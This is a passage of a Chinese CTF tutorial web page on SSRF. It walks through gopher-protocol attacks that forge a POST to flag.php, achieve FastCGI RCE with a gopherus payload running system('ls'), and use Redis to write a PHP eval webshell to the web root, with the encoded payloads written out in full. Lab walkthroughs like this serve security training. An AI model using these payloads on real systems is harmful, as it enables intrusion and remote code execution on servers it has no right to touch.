+<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="x">&lt;!-- 简单的 HTML 表单，允许用户提交 key --&gt;</span>
+<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="x">&lt;form action="/flag.php" method="post"&gt;</span>
+<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="x">&lt;input type="text" name="key"&gt;</span>
+<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a><span class="x">&lt;!-- Debug 信息：将服务器端计算的 key 显示在页面上（方便开发者调试，正常应删除） --&gt;</span>
+<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="x">&lt;!-- Debug: key=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$key</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">--&gt;</span>
+<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="x">&lt;/form&gt;</span>
+</code></pre></div>
+<p>我们知道只要往 <code>flag.php</code> 传 key 值就可以得到 flag</p>
+<p>而 <code>index.php</code> 可以利用 curl 传 url</p>
+<p>那么我们可以用 gopher 协议在 <code>index.php</code> 中构造 POST 请求包往 <code>flag.php</code> 传 Key 值，以此获取 flag</p>
+<p>所以我们通过 gopher 协议构造一个请求，配合 SSRF 模拟成内网用户去访问提交数据</p>
+<p>构造这样的一个请求</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f1dd558cb8da5c8caf6ff.png"></p>
+<p>直接 curl 后接 gopher 协议就先 URL 编码一次</p>
+<p>关键的换行符是 CRLF（\r\n），而不是 LF（\n）单独使用</p>
+<p>因为 <strong>gopher://</strong> 协议是**模拟原始 TCP 字节流**，而 HTTP 的协议报文换行是 <code>\r\n</code>，不能只用 <code>\n</code></p>
+<p>先把换行 <code>\r\n</code> 写成 <strong>百分号编码</strong>（url encode）：</p>
+<ul>
+<li><code>\r</code> =&gt; <code>%0D</code></li>
+<li><code>\n</code> =&gt; <code>%0A</code></li>
+</ul>
+<p>于是变成：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="err">POST%20/flag.php%20HTTP/1.1%0D%0A</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="err">Host:%20127.0.0.1:80%0D%0A</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="err">Content-Type:%20application/x-www-form-urlencoded%0D%0A</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="err">Content-Length:%2036%0D%0A</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="err">%0D%0A</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="err">key=a840f3c56810783306b3a75f861bd31a</span>
+</code></pre></div>
+<p>我这里思路是先跳到内网的 <code>index.php</code> 中再传入 POST 请求</p>
+<p>所以要 URL 编码两次（在向服务器发送请求时，首先浏览器会进行一次 URL解码，因为有两个 ?url，所以会解码两次，其次服务器收到请求后，在执行 <code>curl</code> 功能时，进行第三次 URL解码）</p>
+<p>最终使用 <strong>gopher 协议 + 端口伪造请求</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="err">?url=gopher://127.0.0.1:80/_</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="err"># _ 表示之后开始是 原始 TCP payload</span>
+</code></pre></div>
+<p>最终 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="err">?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f203d58cb8da5c8caf79f.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-8.md -->
+<h3 id="fastcgi-rce">FastCGI 协议 RCE<a class="headerlink" href="#fastcgi-rce" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f45ee58cb8da5c8cb212f.png"></p>
+<p><strong>1️⃣ FastCGI 简介</strong></p>
+<p>FastCGI 是一种用于加速 Web 与后端程序（如 PHP-FPM）通信的协议，常见端口 <code>9000</code></p>
+<p>如果服务器错误暴露了 FastCGI 服务，攻击者可以伪造协议请求，<strong>让 PHP 直接解释任意文件或执行恶意代码</strong></p>
+<p><strong>2️⃣ SSRF 打 FastCGI 的核心原理</strong></p>
+<p>利用 SSRF 请求内网 <code>127.0.0.1:9000</code> 或其他 PHP-FPM 地址，通过 <strong>gopher://</strong> 伪造 <strong>FastCGI 二进制协议数据包</strong>，让服务器解析指定文件或恶意 payload</p>
+<p><strong>效果</strong>：</p>
+<ul>
+<li>解析任意本地 <code>.php</code> 文件（任意文件包含效果）</li>
+<li>配合可控日志或 Session 写入恶意 PHP 代码实现 RCE</li>
+</ul>
+<p>3️⃣ 典型利用流程</p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>动作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1️⃣</td>
+<td>SSRF（gopher）打本地 9000 端口</td>
+</tr>
+<tr>
+<td>2️⃣</td>
+<td>伪造 FastCGI 请求，指定 <code>SCRIPT_FILENAME</code> 指向日志、session、/proc/self/environ 等可以伪造内容的地方</td>
+</tr>
+<tr>
+<td>3️⃣</td>
+<td>让 PHP-FPM 执行恶意代码</td>
+</tr>
+<tr>
+<td>4️⃣</td>
+<td>成功远程命令执行</td>
+</tr>
+</tbody>
+</table>
+<p>本文要利用一个脚本 <a href="https://github.com/tarunkant/Gopherus/tree/master">gopherus.py</a>，这个脚本可以对 SSRF 漏洞进行利用，可以直接生成 payload 造成远程代码执行 RCE</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Gopherus<span class="o">]</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>└─$<span class="w"> </span>python2<span class="w"> </span>gopherus.py<span class="w"> </span>-h<span class="w">                                                             </span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>usage:<span class="w"> </span>gopherus.py<span class="w"> </span><span class="o">[</span>-h<span class="o">]</span><span class="w"> </span><span class="o">[</span>--exploit<span class="w"> </span>EXPLOIT<span class="o">]</span>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>optional<span class="w"> </span>arguments:
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span>-h,<span class="w"> </span>--help<span class="w">         </span>show<span class="w"> </span>this<span class="w"> </span><span class="nb">help</span><span class="w"> </span>message<span class="w"> </span>and<span class="w"> </span><span class="nb">exit</span>
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="w">  </span>--exploit<span class="w"> </span>EXPLOIT<span class="w">  </span>mysql,<span class="w"> </span>postgresql,<span class="w"> </span>fastcgi,<span class="w"> </span>redis,<span class="w"> </span>smtp,<span class="w"> </span>zabbix,
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="w">                     </span>pymemcache,<span class="w"> </span>rbmemcache,<span class="w"> </span>phpmemcache,<span class="w"> </span>dmpmemcache
+</code></pre></div>
+<p>我们选择 fastcgi 的</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>python2<span class="w"> </span>gopherus.py<span class="w"> </span>--exploit<span class="w"> </span>fastcgi
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f54a658cb8da5c8cb5640.png"></p>
+<p>然后输入 <code>/var/www/index.php</code>，运行一下 ls</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f55a658cb8da5c8cb579a.png"></p>
+<p>得到 payload</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f55c758cb8da5c8cb57bf.png"></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="err">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span>
+</code></pre></div>
+<p>再做一次 URL 编码（因为走的是 <code>?url</code>）</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="err">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span>
+</code></pre></div>
+<p>可以看到有个 <code>index.php</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f5ca658cb8da5c8cb5fee.png"></p>
+<p>重新跑一下脚本拿 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f5d1e58cb8da5c8cb6017.png"></p>
+<p>成功拿到 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f5e2858cb8da5c8cb609a.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-9.md -->
+<h3 id="redis-rce">Redis 协议 RCE<a class="headerlink" href="#redis-rce" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f73f558cb8da5c8cb6ab6.png"></p>
+<h4 id="1-ssrf-redis">1️⃣ SSRF 与 Redis 结合的核心思路<a class="headerlink" href="#1-ssrf-redis" title="Permanent link">¶</a></h4>
+<p>利用 <strong>SSRF</strong>（Server-Side Request Forgery，服务端请求伪造），让服务器主动去请求攻击者指定的 Redis 服务（或内网未授权的 Redis 服务），并向 Redis 写入恶意 payload，从而进一步实现 <strong>远程命令执行（RCE）</strong></p>
+<p><strong>2️⃣ SSRF Redis RCE 常见利用链</strong></p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>动作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第一步</td>
+<td>SSRF 控制目标服务请求 Redis（通常使用 <code>gopher://</code> 协议，可以伪造 TCP payload）</td>
+</tr>
+<tr>
+<td>第二步</td>
+<td>向 Redis 发送写入命令，修改其配置，如 <code>dir</code> 和 <code>dbfilename</code></td>
+</tr>
+<tr>
+<td>第三步</td>
+<td>向 Redis 写入 <strong>恶意 SSH 公钥</strong> 或 <strong>计划任务脚本</strong> 到 Web 根目录或 <code>.ssh/authorized_keys</code></td>
+</tr>
+<tr>
+<td>第四步</td>
+<td>触发 Redis 保存（<code>SAVE</code>），将 payload 写入磁盘，造成任意代码执行或提权</td>
+</tr>
+</tbody>
+</table>
+<p>本题依然可以使用 gopherus 实施攻击</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f797258cb8da5c8cb7bc1.png"></p>
+<p>再 URL 编码一次</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f78d458cb8da5c8cb6d16.png"></p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../xxe/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: XXE注入"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        XXE注入
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../php_code_audit/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: PHP 代码审计"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        PHP 代码审计
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#ssrf">SSRF注入</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#file">file 伪协议读取任意文件</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_1">@指定域名绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ip">IP 转十六进制绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#localhost-ip">localhost 代替 IP 绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#dns">DNS 重绑定绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ip_1">域名代替 IP 绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#302">302 跳转绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#12700x-ip">127.0.0.x 代替 IP 绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#0000-ip">0.0.0.0 代替 IP 绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_2">端口扫描</a>
+        
+      </li>
+    
+      <li>
+        <a href="#gopher-http">gopher 协议伪造 HTTP 请求</a>
+        
+      </li>
+    
+      <li>
+        <a href="#fastcgi-rce">FastCGI 协议 RCE</a>
+        
+      </li>
+    
+      <li>
+        <a href="#redis-rce">Redis 协议 RCE</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#1-ssrf-redis">1️⃣ SSRF 与 Redis 结合的核心思路</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
